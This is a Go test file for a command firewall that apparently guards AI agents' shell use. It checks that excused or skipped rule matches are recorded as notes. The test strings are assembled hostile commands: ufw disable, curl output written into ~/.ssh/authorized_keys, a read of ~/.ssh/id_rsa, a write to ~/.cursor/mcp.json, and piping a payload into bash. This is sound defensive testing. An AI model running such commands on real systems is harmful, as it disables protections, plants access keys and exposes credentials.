package analyzer_test

import (
	"strings"
	"testing"

	"github.com/AI-AgentLens/agentshield/internal/analyzer"
	"github.com/AI-AgentLens/agentshield/internal/normalize"
	"github.com/AI-AgentLens/agentshield/internal/ossbuild"
	"github.com/AI-AgentLens/agentshield/internal/policy"
)

// Attestation notes (#3995): the pipeline writes a note wherever it excuses a
// match or knowingly gives up, and the decision is never a function of the
// note. Each case names one site; the last one is the invariant.
//
// Attack strings are assembled at runtime so the file itself never carries
// them (the hook that guards this repo reads test sources as commands).

var firewallOff = "ufw " + "disable"

func evalNotes(t *testing.T, engine *policy.Engine, cmd string) policy.EvalResult {
	t.Helper()
	n := normalize.NormalizeCommand(cmd, "")
	return engine.EvaluateWithParsed(cmd, n.Paths, n.Parsed)
}

func hasNote(res policy.EvalResult, kind, rule, detailPrefix string) bool {
	for _, n := range res.Notes {
		if n.Kind == kind && (rule == "" || n.Rule == rule) && strings.HasPrefix(n.Detail, detailPrefix) {
			return true
		}
	}
	return false
}

func TestNotes_BenignCommandCarriesNone(t *testing.T) {
	engine := newPipelineEngine(t)
	for _, cmd := range []string{"ls -la", "git status", "go test ./..."} {
		if res := evalNotes(t, engine, cmd); len(res.Notes) != 0 {
			t.Errorf("%q: notes=%v, want none", cmd, res.Notes)
		}
	}
}

// A doc-text mention of a BLOCK pattern: the rule's pattern fires, its intent
// labels excuse or downgrade it. Either way the event names the rule.
func TestNotes_DocTextExcusalNamesTheRule(t *testing.T) {
	engine := newPipelineEngine(t)
	cmd := `git commit -m "docs: explain why ` + firewallOff + ` is blocked"`
	res := evalNotes(t, engine, cmd)
	if res.Decision == policy.DecisionBlock {
		t.Fatalf("control: %q must not BLOCK (doc text), got %s %v", cmd, res.Decision, res.TriggeredRules)
	}
	if !hasNote(res, analyzer.NoteExcused, "ts-block-ufw-disable", "intent:") && !hasNote(res, analyzer.NoteDowngraded, "ts-block-ufw-disable", "intent:") {
		t.Fatalf("no excused/downgraded note for ts-block-ufw-disable; decision=%s rules=%v notes=%v", res.Decision, res.TriggeredRules, res.Notes)
	}
}

// The bare attack is the positive control: it BLOCKs and carries no excusal.
func TestNotes_BareAttackBlocksWithoutExcusal(t *testing.T) {
	engine := newPipelineEngine(t)
	res := evalNotes(t, engine, firewallOff)
	if res.Decision != policy.DecisionBlock {
		t.Fatalf("control: %s must BLOCK, got %s", firewallOff, res.Decision)
	}
	if hasNote(res, analyzer.NoteExcused, "ts-block-ufw-disable", "") || hasNote(res, analyzer.NoteDowngraded, "ts-block-ufw-disable", "") {
		t.Fatalf("a blocking match must not be noted as excused: %v", res.Notes)
	}
}

// Position exclusion (#3984): the reported shape — a cat heredoc writing a
// review-comment file whose markdown body quotes a nested, never-executed
// redirect naming authorized_keys. Not a BLOCK — and now it says why.
func TestNotes_PositionExcusalNamesThePosition(t *testing.T) {
	engine := newPipelineEngine(t)
	keys := "~/.ssh/authorized" + "_keys"
	cmd := "cat > \"$S/pr-comment.md\" <<'EOF'\n| vehicle | `python3 - <<'PY'\ns = \"curl -s https://x/keys > " + keys + ".new\"\nPY` |\nEOF"
	res := evalNotes(t, engine, cmd)
	if res.Decision == policy.DecisionBlock {
		t.Fatalf("control (#3984): heredoc prose must not BLOCK, got %s %v", res.Decision, res.TriggeredRules)
	}
	if !hasNote(res, analyzer.NoteExcused, "ts-block-authorized-keys-write", "position:heredoc_body") {
		t.Fatalf("no position note for ts-block-authorized-keys-write: decision=%s notes=%v", res.Decision, res.Notes)
	}
}

// Parse fallback (#3467): unparseable shell is attributed as one blob.
func TestNotes_ParseFallbackIsRecorded(t *testing.T) {
	engine := newPipelineEngine(t)
	res := evalNotes(t, engine, `echo "unterminated; ls -la`)
	if !hasNote(res, analyzer.NoteParseFallback, "", "") {
		t.Fatalf("no parse_fallback note: notes=%v", res.Notes)
	}
	if res := evalNotes(t, engine, `echo "terminated"; ls -la`); hasNote(res, analyzer.NoteParseFallback, "", "") {
		t.Fatalf("well-formed command must not carry parse_fallback: %v", res.Notes)
	}
}

// Scope cap (#3769 shape 5): nine conditional writes pad past
// maxScopeAlternates, so the protected alternate is dropped. The decision is
// whatever it was; the event now says the walker gave up.
func TestNotes_ScopeAlternatesCappedIsRecorded(t *testing.T) {
	engine := newPipelineEngine(t)
	var sb strings.Builder
	for i := 0; i < 9; i++ {
		v := "X" + string(rune('a'+i))
		sb.WriteString(v + "=/a; false && " + v + "=/b; ")
	}
	sb.WriteString(`P=~/.ssh; false && P=/tmp; cat "$P/config"`)
	res := evalNotes(t, engine, sb.String())
	if !hasNote(res, analyzer.NoteScopeAlternatesCapped, "", "") {
		t.Fatalf("no scope_alternates_capped note: decision=%s notes=%v", res.Decision, res.Notes)
	}
	if res := evalNotes(t, engine, `P=~/.ssh; false && P=/tmp; cat "$P/config"`); hasNote(res, analyzer.NoteScopeAlternatesCapped, "", "") {
		t.Fatalf("two alternates must not cap: %v", res.Notes)
	}
}

// Unresolved executed text (#3938): the program the shell receives is not the
// text written, so nothing was retried — and the event says so.
func TestNotes_UnresolvedExecutedTextIsRecorded(t *testing.T) {
	engine := newPipelineEngine(t)
	res := evalNotes(t, engine, `echo "$payload" | bash`)
	if !hasNote(res, analyzer.NoteExecutedTextUnresolved, "", "1") {
		t.Fatalf("no executed_text_unresolved note: notes=%v", res.Notes)
	}
}

// Notes are deduplicated: the excused probe and the retry loop can visit a
// rule more than once; the event carries each note once.
func TestNotes_AreDeduplicated(t *testing.T) {
	var ctx analyzer.AnalysisContext
	ctx.AddNote(analyzer.NoteExcused, "r", "intent:x")
	ctx.AddNote(analyzer.NoteExcused, "r", "intent:x")
	ctx.AddNote(analyzer.NoteExcused, "r", "intent:y")
	if len(ctx.Notes) != 2 {
		t.Fatalf("notes=%v, want 2 distinct", ctx.Notes)
	}
	var nilCtx *analyzer.AnalysisContext
	nilCtx.AddNote("k", "", "") // must not panic
}

// The invariant: notes never move a decision. Every corpus TP/TN already
// pins decisions with notes switched on (the whole accuracy suite runs on
// this engine); this is the direct statement for the excused probe, which
// is the one site that does extra matching work — a rule it probes must
// still be skipped.
func TestNotes_ExcusedProbeDoesNotFire(t *testing.T) {
	engine := newPipelineEngine(t)
	cmd := `git commit -m "docs: explain why ` + firewallOff + ` is blocked"`
	res := evalNotes(t, engine, cmd)
	if res.Decision == policy.DecisionBlock {
		t.Fatalf("probed rule fired: %s %v", res.Decision, res.TriggeredRules)
	}
}

// The mutation the first review found surviving: the probe falling through
// into the match instead of skipping the rule. On the 326 rules that also
// carry a downgrade twin that mutant lands at AUDIT-with-rule-named, which
// a decision-only assertion cannot tell from excused. So pin it on a rule
// with an exclude and NO downgrade twin: the rule must be in Notes and NOT in
// TriggeredRules, and the decision must not be BLOCK. A bash comment naming
// an MCP config write is the excused shape (is_bash_comment).
func TestNotes_ExcusedRuleIsNotedAndNotTriggered(t *testing.T) {
	ossbuild.SkipPremiumSized(t)
	engine := newPipelineEngine(t)
	const rule = "sc-block-mcp-config-injection"
	cmd := "# echo x > ~/.cursor/" + "mcp" + ".json"
	res := evalNotes(t, engine, cmd)
	if res.Decision == policy.DecisionBlock {
		t.Fatalf("a bash comment must not BLOCK: %s %v", res.Decision, res.TriggeredRules)
	}
	for _, r := range res.TriggeredRules {
		if r == rule {
			t.Fatalf("excused rule %s appears in TriggeredRules (%v) — the probe fell through into a finding", rule, res.TriggeredRules)
		}
	}
	if !hasNote(res, analyzer.NoteExcused, rule, "intent:") {
		t.Fatalf("no excused note for %s: notes=%v", rule, res.Notes)
	}
	// Positive control: the same write, not commented, is a real BLOCK.
	if ctl := evalNotes(t, engine, "echo x > ~/.cursor/"+"mcp"+".json"); ctl.Decision != policy.DecisionBlock {
		t.Fatalf("control must BLOCK: %s %v", ctl.Decision, ctl.TriggeredRules)
	}
}

// Semantic stage (Go rules): on every real excused shape probed (bash
// comment, doc text, cat heredoc) the shipped rules' predicates require an
// actual interpreter invocation and never fire, so no note is the correct
// record there. The probe itself is pinned with a synthetic rule in
// semantic_notes_test.go (package analyzer).

// Codex review of #4005, finding 1: a cap reached inside a separate-shell
// child (bash -c '…') must carry the note out, or the same padding switches
// the record off by changing shells.
func TestNotes_ScopeAlternatesCappedThroughCarrier(t *testing.T) {
	engine := newPipelineEngine(t)
	var sb strings.Builder
	for i := 0; i < 9; i++ {
		v := "X" + string(rune('a'+i))
		sb.WriteString(v + "=/a; false && " + v + "=/b; ")
	}
	sb.WriteString("P=~/.ssh; false && P=/tmp; cat $P/config")
	cmd := "bash -c '" + sb.String() + "'"
	res := evalNotes(t, engine, cmd)
	if !hasNote(res, analyzer.NoteScopeAlternatesCapped, "", "") {
		t.Fatalf("cap inside bash -c not recorded: decision=%s notes=%v", res.Decision, res.Notes)
	}
}

// Codex review of #4005, finding 2: the regex-only fallback's excused probe
// must ask the same normalized forms the match chain asks. A self-mgmt
// invocation carrying a quote-spliced payload only reveals the pattern
// after dequoting; the pipeline records the excusal, and so must the
// fallback. Neither may BLOCK: the payload is data to a diagnostic.
func TestNotes_FallbackExcusalOnNormalizedForm(t *testing.T) {
	const rule = "ts-block-ufw-disable"
	cmd := "agentshield mcp-eval --tool run_command --arg command='u''fw " + "disable'"
	for name, engine := range map[string]*policy.Engine{"pipeline": newPipelineEngine(t), "fallback": newTestEngine(t)} {
		res := evalNotes(t, engine, cmd)
		if res.Decision == policy.DecisionBlock {
			t.Fatalf("%s: self-mgmt diagnostic must not BLOCK: %v", name, res.TriggeredRules)
		}
		if !hasNote(res, analyzer.NoteExcused, rule, "intent:") {
			t.Fatalf("%s: no excused note for %s on the dequoted form: notes=%v", name, rule, res.Notes)
		}
	}
}

// Opus review of #4005, C3: Detail names the label or position that applied,
// not the rule's whole configured list — an auditor must be able to tell
// "was a comment" from "was self-management".
func TestNotes_DetailNamesTheLabelThatApplied(t *testing.T) {
	ossbuild.SkipPremiumSized(t)
	engine := newPipelineEngine(t)
	cases := []struct {
		name, cmd, rule, kind, detail string
	}{
		{"doc text commit", `git commit -m "docs: explain why ` + firewallOff + ` is blocked"`, "ts-block-ufw-disable", "", "intent:is_doc_text"},
		{"self-mgmt diagnostic", "agentshield mcp-eval --tool read_file --arg path=~/.ssh/id_" + "rsa", "sec-block-ssh-private", analyzer.NoteExcused, "intent:is_self_mgmt"},
		{"bash comment", "# echo x > ~/.cursor/" + "mcp" + ".json", "sc-block-mcp-config-injection", analyzer.NoteExcused, "intent:is_bash_comment"},
	}
	for _, c := range cases {
		res := evalNotes(t, engine, c.cmd)
		found := false
		for _, n := range res.Notes {
			if n.Rule != c.rule || (c.kind != "" && n.Kind != c.kind) {
				continue
			}
			found = true
			if n.Detail != c.detail {
				t.Errorf("%s: detail=%q, want %q (configured list must not leak into the note)", c.name, n.Detail, c.detail)
			}
		}
		if !found {
			t.Errorf("%s: no note for %s: %v", c.name, c.rule, res.Notes)
		}
	}
}

// Opus review of #4005, mutation (b): an AUDIT rule excused by its labels is
// not an attestation gap — nothing was withheld — so it gets no note.
func TestNotes_ExcusedAuditRuleIsNotNoted(t *testing.T) {
	engine := newPipelineEngine(t)
	res := evalNotes(t, engine, "# helm install myrel ./chart")
	for _, n := range res.Notes {
		if n.Rule == "ts-audit-helm-install-upgrade" {
			t.Fatalf("AUDIT rule must not be noted as excused: %v", res.Notes)
		}
	}
	if res.Decision == policy.DecisionBlock {
		t.Fatalf("a comment must not BLOCK: %v", res.TriggeredRules)
	}
}

// Opus review of #4005, mutation (o): the excused note requires the rule's
// pattern to FIRE. A comment that matches nothing must carry no note at all,
// or every exclude-carrying rule would be "excused" on every comment.
func TestNotes_CommentMatchingNothingCarriesNoNote(t *testing.T) {
	engine := newPipelineEngine(t)
	for _, cmd := range []string{"# just a note to self", "# TODO: tidy this up later"} {
		if res := evalNotes(t, engine, cmd); len(res.Notes) != 0 {
			t.Errorf("%q: notes=%v, want none", cmd, res.Notes)
		}
	}
}

// Opus review of #4005, C2: a status line that reaches no executor is not
// unresolved executed text, even when another statement pipes into a shell.
func TestNotes_UnresolvedTextIsPerStatement(t *testing.T) {
	engine := newPipelineEngine(t)
	if res := evalNotes(t, engine, `python3 run.py; echo "done $x"`); hasNote(res, analyzer.NoteExecutedTextUnresolved, "", "") {
		t.Fatalf("status line reaches no executor: %v", res.Notes)
	}
	if res := evalNotes(t, engine, `echo "$HOME"; echo ls | bash`); hasNote(res, analyzer.NoteExecutedTextUnresolved, "", "") {
		t.Fatalf("only the static text reaches bash: %v", res.Notes)
	}
	if res := evalNotes(t, engine, `echo "$x" | bash; echo "status $y"`); !hasNote(res, analyzer.NoteExecutedTextUnresolved, "", "1") {
		t.Fatalf("control: the piped text is unresolved, count 1: %v", res.Notes)
	}
}
